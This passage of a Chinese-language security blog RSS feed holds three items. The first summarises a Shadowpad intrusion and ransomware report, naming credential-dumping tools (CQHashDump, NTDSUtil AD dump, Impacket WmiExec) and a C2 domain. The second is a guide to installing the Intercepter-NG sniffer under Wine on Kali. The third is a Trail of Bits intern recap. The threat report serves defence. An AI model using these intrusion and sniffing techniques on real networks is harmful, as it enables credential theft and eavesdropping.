&lt;p&gt;再次感谢Paul分享这个很酷的技术。下次见！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Shadowpad恶意软件升级导致勒索软件部署：新型攻击手法深度分析</title>
        <link>http://localhost:1313/p/shadowpad%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7%E5%AF%BC%E8%87%B4%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 05:04:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/shadowpad%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7%E5%AF%BC%E8%87%B4%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E6%96%B0%E5%9E%8B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</guid>
        <description>&lt;img src="https://www.trendmicro.com/content/dam/trendmicro/global/en/images/photography/technology/abstract-security-background.jpg" alt="Featured image of post Shadowpad恶意软件升级导致勒索软件部署：新型攻击手法深度分析" /&gt;&lt;h3 id=&#34;关键发现&#34;&gt;关键发现
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;欧洲两起事件响应案例涉及与中国高级威胁组织关联的Shadowpad恶意软件。研究发现该恶意软件在7个月内攻击了全球15个国家的21家企业，其中制造业占比超50%。&lt;/li&gt;
&lt;li&gt;攻击者通过弱密码爆破VPN并绕过证书型多因素认证（具体方法未知）入侵网络，最终在域控制器部署Shadowpad。&lt;/li&gt;
&lt;li&gt;部分案例中，攻击者部署了此前未公开的新型勒索软件家族，其加密算法与Kodex Evil Extractor工具有显著差异，可能是攻击者的误导手段。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;攻击链分析&#34;&gt;攻击链分析
&lt;/h3&gt;&lt;h4 id=&#34;初始入侵&#34;&gt;初始入侵
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;攻击路径：VPN → 弱密码爆破/多因素认证绕过 → 获取管理员权限 → 部署Shadowpad&lt;/li&gt;
&lt;li&gt;特殊手段：在证书型MFA环境下仍成功突破（可能通过预先获取有效证书）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;恶意工具集&#34;&gt;恶意工具集
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Shadowpad变种&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新增反调试技术（6种检测机制，包括PEB检查、RDTSC指令计时等）&lt;/li&gt;
&lt;li&gt;采用DoH（DNS over HTTPS）隐藏C2通信&lt;/li&gt;
&lt;li&gt;配置结构升级：新增3字节标识符和类型字段（含5种加密数据类型）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;新型勒索软件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加载链：合法usysdiag.exe → 恶意sensapi.dll → 加密载荷usysdiag.dat&lt;/li&gt;
&lt;li&gt;加密机制：每文件生成随机AES密钥 → RSA公钥加密后附加到文件末尾&lt;/li&gt;
&lt;li&gt;伪装手段：复制Kodex勒索说明文档界面但实际算法完全不同&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;后期工具&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CQHashDumpv2：提取SAM数据库&lt;/li&gt;
&lt;li&gt;Impacket工具包：WmiExec远程执行&lt;/li&gt;
&lt;li&gt;NTDSUtil：转储Active Directory数据库（生成aaaa.dit文件）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术对抗演进&#34;&gt;技术对抗演进
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;反分析增强&lt;/strong&gt;：利用卷序列号加密内存载荷，删除磁盘原始文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C2隐蔽通信&lt;/strong&gt;：历史版本使用8个C2域名，当前仅发现updata.dsqurey[.]com活跃&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;载荷投递&lt;/strong&gt;：滥用11种合法签名程序（如NVIDIA/微软/华硕的旧版软件）进行DLL侧加载&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;受害者画像&#34;&gt;受害者画像
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;行业&lt;/th&gt;
          &lt;th&gt;数量&lt;/th&gt;
          &lt;th&gt;地域分布&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;制造业&lt;/td&gt;
          &lt;td&gt;11&lt;/td&gt;
          &lt;td&gt;欧洲(9)、亚洲(8)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;交通运输&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;中东(3)、南美(1)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;出版业&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;制造业等高危行业应重点检查VPN的证书型MFA实现漏洞&lt;/li&gt;
&lt;li&gt;监控异常进程（如RoboTaskBarIcon.exe加载roboform-x64.dll）&lt;/li&gt;
&lt;li&gt;部署具备内存取证能力的EDR产品对抗无文件攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;值得注意的是，所有勒索支付地址均未观测到资金流入，表明攻击者可能以数据窃取为主要目的，勒索仅为干扰手段。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;完整IOC列表和检测规则可通过Trend Vision One平台获取。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>在Linux上运行原版Intercepter-NG网络嗅探工具</title>
        <link>http://localhost:1313/p/%E5%9C%A8linux%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%89%88intercepter-ng%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Sun, 03 Aug 2025 04:53:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9C%A8linux%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%89%88intercepter-ng%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h1 id=&#34;在linux上运行原版intercepter-ng&#34;&gt;在Linux上运行原版Intercepter-NG
&lt;/h1&gt;&lt;h2 id=&#34;操作指南已更新&#34;&gt;操作指南（已更新！）
&lt;/h2&gt;&lt;p&gt;[1] 下载Wine用的WinPcap封装库及libpcap-dev&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://sniff.su/wine_pcap_dlls.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install libpcap-dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果是i386版Kali系统，直接跳转至步骤[3]。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;[2] Kali x64系统需执行以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg --add-architecture i386
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install wine-bin:i386
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install tcpdump:i386
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;[3] 将dll文件复制到wine库目录&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp wpcap.dll.so /usr/lib/i386-linux-gnu/wine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp packet.dll.so /usr/lib/i386-linux-gnu/wine
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;[4] 安装winetricks并配置&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install winetricks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winetricks cc580
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ethtool --offload eth0 rx off tx off
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;[5] 下载Intercepter-NG 0.9.9并移除冲突dll&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm wpcap.dll
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm packet.dll
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wine Intercepter-NG.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;文件缺失错误&lt;/strong&gt;&lt;br&gt;
确保从压缩包完整提取所有文件，包括&lt;code&gt;packet.dll.so&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;配置文件报错&lt;/strong&gt;&lt;br&gt;
必须以root用户身份（非sudo）在程序所在目录直接运行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Kali 2.0兼容性问题&lt;/strong&gt;&lt;br&gt;
建议使用Wine 1.4版本运行程序&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;64位系统支持&lt;/strong&gt;&lt;br&gt;
需完整安装32位兼容库：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dpkg --add-architecture i386
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install ia32-libs -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;注意：程序开发者不提供Linux系统或第三方应用的配置支持，本教程仅适用于Kali 1.x/2.0系统环境。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Trail of Bits 2020冬季实习项目亮点：从反编译器到智能合约安全</title>
        <link>http://localhost:1313/p/trail-of-bits-2020%E5%86%AC%E5%AD%A3%E5%AE%9E%E4%B9%A0%E9%A1%B9%E7%9B%AE%E4%BA%AE%E7%82%B9%E4%BB%8E%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8%E5%88%B0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/</link>
        <pubDate>Sun, 03 Aug 2025 04:42:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/trail-of-bits-2020%E5%86%AC%E5%AD%A3%E5%AE%9E%E4%B9%A0%E9%A1%B9%E7%9B%AE%E4%BA%AE%E7%82%B9%E4%BB%8E%E5%8F%8D%E7%BC%96%E8%AF%91%E5%99%A8%E5%88%B0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/</guid>
        <description>&lt;h3 id=&#34;aaron-yoo--anvill反编译器&#34;&gt;Aaron Yoo — Anvill反编译器
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;加州大学洛杉矶分校&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我在Anvill反编译器中添加了一个生成LLVM位码函数&amp;quot;JSON规范&amp;quot;的工具。这些规范告知Anvill函数参数和返回值等重要值的物理位置（寄存器或内存）。典型规范示例如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;arch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;#34;functions&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;demangled_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;test(long, long)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;_Z4testll&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nt&#34;&gt;&amp;#34;parameters&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;param1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nt&#34;&gt;&amp;#34;register&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;RDI&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nt&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;l&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过该项目，我深入了解了ABI规范，并解决了高级参数分散在多个机器寄存器中的技术难题。&lt;/p&gt;
&lt;h3 id=&#34;paweł-płatek--deepstate与python&#34;&gt;Paweł Płatek — DeepState与Python
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AGH科技大学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我主要修复了DeepState Python部分的构建问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CMake&lt;/strong&gt;：修正构建选项，增加仅构建示例的选项&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Docker&lt;/strong&gt;：采用多阶段构建，支持Honggfuzz和Angora&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模糊测试执行器&lt;/strong&gt;：统一参数处理，重新实现日志系统和运行时统计&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试体系&lt;/strong&gt;：创建基础测试用例验证执行器功能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文档&lt;/strong&gt;：拆分文档结构，新增模糊测试使用指南&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;philip-zhengyuan-wang--manticore&#34;&gt;Philip Zhengyuan Wang — Manticore
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;马里兰大学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我开发了&amp;quot;mcorepv&amp;quot;工具实现Manticore的云化部署：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过Ansible自动配置DigitalOcean云主机&lt;/li&gt;
&lt;li&gt;使用Protobuf协议实时传输分析状态&lt;/li&gt;
&lt;li&gt;开发终端用户界面(TUI)监控运行状态&lt;/li&gt;
&lt;li&gt;实现工作目录自动同步和日志回传&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当前待解决问题包括SSH端口转发优化和TUI信息展示改进。&lt;/p&gt;
&lt;h3 id=&#34;samuel-caccavale--go代码分析&#34;&gt;Samuel Caccavale — Go代码分析
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;东北大学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;开发基于AST和SSA的Go代码扫描器，可检测以下模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;unsafe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ok&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ok&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unsafe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 危险的类型断言使用&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;相比GoSec等工具，能更精确识别类型断言值的上下文使用安全。&lt;/p&gt;
&lt;h3 id=&#34;taylor-pothast--mishegos&#34;&gt;Taylor Pothast — Mishegos
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;范德堡大学&lt;/strong&gt;&lt;/p&gt;
